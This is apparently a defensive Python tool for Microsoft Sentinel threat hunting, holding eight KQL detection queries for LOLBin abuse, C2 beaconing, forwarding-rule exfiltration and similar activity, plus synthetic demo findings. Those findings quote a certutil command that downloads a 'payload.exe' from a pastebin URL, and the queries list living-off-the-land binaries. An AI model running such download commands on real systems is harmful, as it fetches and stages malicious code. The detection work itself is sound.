#!/usr/bin/env python3
"""Sentinel threat hunting — hypothesis-driven hunts, IOC sweeps, and campaign detection.

Each hunt is documented with hypothesis, KQL query, findings, and outcome.
"""

import argparse
import json
import os
from datetime import datetime, timedelta


# ─── Hunt library — hypothesis-driven threat hunts ───────────────────────────

HUNT_LIBRARY = [
    {
        "id": "H001",
        "name": "Living-off-the-Land Binaries (LOLBins)",
        "hypothesis": "Attackers are using legitimate Windows binaries to execute malicious payloads, bypassing application control",
        "tactic": "DefenseEvasion",
        "techniques": ["T1218.011", "T1218.005", "T1218.010"],
        "frequency": "weekly",
        "query": """DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName in~ ("mshta.exe","regsvr32.exe","rundll32.exe","certutil.exe","msbuild.exe","installutil.exe")
| where InitiatingProcessFileName != "explorer.exe"
| summarize ExecutionCount=count(), UniqueDevices=dcount(DeviceName), 
    CommandLines=make_set(ProcessCommandLine, 5)
    by FileName, InitiatingProcessFileName, AccountName
| where ExecutionCount > 3
| sort by ExecutionCount desc""",
        "data_sources": ["DeviceProcessEvents"],
    },
    {
        "id": "H002",
        "name": "Anomalous Outbound Connections",
        "hypothesis": "Compromised hosts are beaconing to C2 infrastructure at regular intervals",
        "tactic": "CommandAndControl",
        "techniques": ["T1071.001", "T1572"],
        "frequency": "daily",
        "query": """DeviceNetworkEvents
| where Timestamp > ago(24h)
| where RemoteIPType == "Public"
| where ActionType == "ConnectionSuccess"
| summarize ConnectionCount=count(), AvgBytesOut=avg(SentBytes) by DeviceName, RemoteIP, RemotePort
| where ConnectionCount > 50
| join kind=leftanti (
    DeviceNetworkEvents
    | where Timestamp between(ago(30d) .. ago(7d))
    | summarize by RemoteIP
) on RemoteIP
| sort by ConnectionCount desc""",
        "data_sources": ["DeviceNetworkEvents"],
    },
    {
        "id": "H003",
        "name": "Service Account Abuse",
        "hypothesis": "Service accounts are being used interactively or from unexpected sources, indicating credential theft",
        "tactic": "CredentialAccess",
        "techniques": ["T1078.002"],
        "frequency": "weekly",
        "query": """SigninLogs
| where TimeGenerated > ago(7d)
| where UserPrincipalName startswith "svc-" or UserPrincipalName startswith "service" or UserPrincipalName startswith "sa-"
| where AppDisplayName !in~ ("Azure AD PowerShell","Microsoft Azure CLI","Azure Portal")
| summarize LoginCount=count(), UniqueIPs=dcount(IPAddress), Apps=make_set(AppDisplayName, 5)
    by UserPrincipalName, IPAddress
| where LoginCount > 1
| sort by LoginCount desc""",
        "data_sources": ["SigninLogs"],
    },
    {
        "id": "H004",
        "name": "Email Forwarding Rule Creation",
        "hypothesis": "Compromised mailboxes are being configured to forward emails to external addresses for data exfiltration",
        "tactic": "Collection",
        "techniques": ["T1114.003"],
        "frequency": "daily",
        "query": """OfficeActivity
| where TimeGenerated > ago(24h)
| where Operation in~ ("New-InboxRule","Set-InboxRule","Enable-InboxRule")
| extend RuleParameters = tostring(Parameters)
| where RuleParameters has_any ("ForwardTo","ForwardAsAttachmentTo","RedirectTo")
| project TimeGenerated, UserId, Operation, RuleParameters, ClientIP
| sort by TimeGenerated desc""",
        "data_sources": ["OfficeActivity"],
    },
    {
        "id": "H005",
        "name": "Scheduled Task Persistence",
        "hypothesis": "Attackers have established persistence via scheduled tasks that execute suspicious binaries or scripts",
        "tactic": "Persistence",
        "techniques": ["T1053.005"],
        "frequency": "weekly",
        "query": """DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName == "schtasks.exe"
| where ProcessCommandLine has "/create"
| where ProcessCommandLine has_any ("powershell","cmd","wscript","cscript","mshta","http","\\\\")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| sort by Timestamp desc""",
        "data_sources": ["DeviceProcessEvents"],
    },
    {
        "id": "H006",
        "name": "Impossible Travel (Custom)",
        "hypothesis": "User accounts are being used from geographically impossible locations within short timeframes, indicating credential compromise",
        "tactic": "InitialAccess",
        "techniques": ["T1078"],
        "frequency": "daily",
        "query": """SigninLogs
| where TimeGenerated > ago(24h)
| where ResultType == 0
| extend City = tostring(LocationDetails.city), Country = tostring(LocationDetails.countryOrRegion)
| summarize Locations=make_set(strcat(City,", ",Country)), LocationCount=dcount(strcat(City,Country)),
    MinTime=min(TimeGenerated), MaxTime=max(TimeGenerated)
    by UserPrincipalName
| where LocationCount > 2
| where datetime_diff('hour', MaxTime, MinTime) < 4
| sort by LocationCount desc""",
        "data_sources": ["SigninLogs"],
    },
    {
        "id": "H007",
        "name": "Sensitive File Access Spikes",
        "hypothesis": "A user or process is accessing an unusual volume of sensitive files, potentially staging for exfiltration",
        "tactic": "Collection",
        "techniques": ["T1530", "T1213"],
        "frequency": "daily",
        "query": """CloudAppEvents
| where Timestamp > ago(24h)
| where ActionType in~ ("FileDownloaded","FileAccessed","FilePreviewed")
| summarize FileCount=count(), UniqueFiles=dcount(ObjectName) by AccountDisplayName, Application
| where FileCount > 100
| join kind=leftanti (
    CloudAppEvents
    | where Timestamp between(ago(30d) .. ago(7d))
    | where ActionType in~ ("FileDownloaded","FileAccessed")
    | summarize AvgDaily=count()/23 by AccountDisplayName
    | where AvgDaily > 50
) on AccountDisplayName
| sort by FileCount desc""",
        "data_sources": ["CloudAppEvents"],
    },
    {
        "id": "H008",
        "name": "Privilege Escalation via Group Membership",
        "hypothesis": "Accounts are being added to privileged groups outside of normal change management windows",
        "tactic": "PrivilegeEscalation",
        "techniques": ["T1078.002", "T1098"],
        "frequency": "daily",
        "query": """AuditLogs
| where TimeGenerated > ago(24h)
| where OperationName has "Add member to role" or OperationName has "Add member to group"
| extend TargetGroup = tostring(TargetResources[0].displayName)
| where TargetGroup has_any ("Global Administrator","Security Administrator","Exchange Administrator",
    "SharePoint Administrator","Application Administrator","Privileged Role Administrator")
| project TimeGenerated, InitiatedBy=tostring(InitiatedBy.user.userPrincipalName),
    TargetUser=tostring(TargetResources[0].userPrincipalName), TargetGroup
| sort by TimeGenerated desc""",
        "data_sources": ["AuditLogs"],
    },
]


def generate_demo_hunt_results():
    """Generate realistic threat hunt results for demo mode."""
    now = datetime.now()
    return [
        {
            "huntId": "H001",
            "name": "Living-off-the-Land Binaries (LOLBins)",
            "hypothesis": HUNT_LIBRARY[0]["hypothesis"],
            "executedAt": now.isoformat() + "Z",
            "duration": "12.4s",
            "recordsScanned": 1_840_000,
            "findingsCount": 3,
            "outcome": "suspicious",
            "findings": [
                {
                    "description": "certutil.exe used to download file from external URL on WKS-FINANCE-01",
                    "severity": "high",
                    "details": {"device": "WKS-FINANCE-01", "user": "j.smith",
                               "command": 'certutil.exe -urlcache -split -f "https://pastebin.com/raw/abc123" C:\\Windows\\Temp\\payload.exe',
                               "count": 1},
                    "recommendation": "Investigate immediately — certutil download is a classic LOLBin technique",
                },
                {
                    "description": "mshta.exe spawned by Outlook on 2 devices",
                    "severity": "medium",
                    "details": {"devices": ["WKS-SALES-03", "WKS-MARKETING-01"], "parent": "outlook.exe", "count": 4},
                    "recommendation": "Likely phishing payload execution — correlate with MDO email alerts",
                },
                {
                    "description": "regsvr32.exe /s /n /u /i: usage pattern on WKS-DEV-04",
                    "severity": "low",
                    "details": {"device": "WKS-DEV-04", "user": "d.developer", "count": 7},
                    "recommendation": "Likely developer tooling — verify with user, add to FP exclusion if legitimate",
                },
            ],
        },
        {
            "huntId": "H002",
            "name": "Anomalous Outbound Connections",
            "hypothesis": HUNT_LIBRARY[1]["hypothesis"],
            "executedAt": now.isoformat() + "Z",
            "duration": "28.7s",
            "recordsScanned": 5_200_000,
            "findingsCount": 1,
            "outcome": "suspicious",
            "findings": [
                {
                    "description": "WKS-FINANCE-01 beaconing to 185.220.101.42 every 5 minutes (288 connections in 24h)",
                    "severity": "high",
                    "details": {"device": "WKS-FINANCE-01", "remoteIP": "185.220.101.42",
                               "port": 443, "connections": 288, "avgBytesOut": 1240,
                               "firstSeen": (now - timedelta(hours=23)).isoformat() + "Z"},
                    "recommendation": "Strong C2 beaconing pattern — correlate with XDR Bot alerts, consider isolation",
                },
            ],
        },
        {
            "huntId": "H004",
            "name": "Email Forwarding Rule Creation",
            "hypothesis": HUNT_LIBRARY[3]["hypothesis"],
            "executedAt": now.isoformat() + "Z",
            "duration": "3.2s",
            "recordsScanned": 320_000,
            "findingsCount": 1,
            "outcome": "confirmed_threat",
            "findings": [
                {
                    "description": "j.smith@contoso.com created inbox rule forwarding all emails to external address",
                    "severity": "critical",
                    "details": {"user": "j.smith@contoso.com", "ruleAction": "ForwardTo",
                               "destination": "j.smith.backup@protonmail.com",
                               "createdFrom": "185.220.101.42"},
                    "recommendation": "CONFIRMED COMPROMISE — forwarding rule created from known C2 IP. Remove rule, disable account, notify XDR Bot.",
                },
            ],
        },
        {
            "huntId": "H003",
            "name": "Service Account Abuse",
            "hypothesis": HUNT_LIBRARY[2]["hypothesis"],
            "executedAt": now.isoformat() + "Z",
            "duration": "5.1s",
            "recordsScanned": 125_000,
            "findingsCount": 0,
            "outcome": "clean",
            "findings": [],
        },
        {
            "huntId": "H006",
            "name": "Impossible Travel (Custom)",
            "hypothesis": HUNT_LIBRARY[5]["hypothesis"],
            "executedAt": now.isoformat() + "Z",
            "duration": "6.8s",
            "recordsScanned": 125_000,
            "findingsCount": 0,
            "outcome": "clean",
            "findings": [],
        },
    ]


def main():
    p = argparse.ArgumentParser(description="Sentinel threat hunting engine")
    p.add_argument("--demo", action="store_true", help="Use synthetic demo data")
    p.add_argument("--action", choices=["list", "run", "sweep", "results"], default="results")
    p.add_argument("--hunt-id", help="Specific hunt to run")
    p.add_argument("--output", help="Output file")
    args = p.parse_args()

    if args.action == "list":
        result = {
            "hunts": [{k: v for k, v in h.items() if k != "query"} for h in HUNT_LIBRARY],
            "count": len(HUNT_LIBRARY),
        }
    elif args.demo or args.action == "results":
        hunt_results = generate_demo_hunt_results()

        total_findings = sum(h["findingsCount"] for h in hunt_results)
        threats = len([h for h in hunt_results if h["outcome"] == "confirmed_threat"])
        suspicious = len([h for h in hunt_results if h["outcome"] == "suspicious"])
        clean = len([h for h in hunt_results if h["outcome"] == "clean"])

        result = {
            "generatedAt": datetime.now().isoformat() + "Z",
            "huntsExecuted": len(hunt_results),
            "totalFindings": total_findings,
            "confirmedThreats": threats,
            "suspicious": suspicious,
            "clean": clean,
            "hunts": hunt_results,
        }
    else:
        result = {"error": "Live hunting requires Sentinel workspace connection — use --demo for demonstration"}

    out = json.dumps(result, indent=2)
    if args.output:
        os.makedirs(os.path.dirname(args.output) or ".", exist_ok=True)
        with open(args.output, "w") as f:
            f.write(out)
        print(f"Written to {args.output}")
    else:
        print(out)


if __name__ == "__main__":
    main()
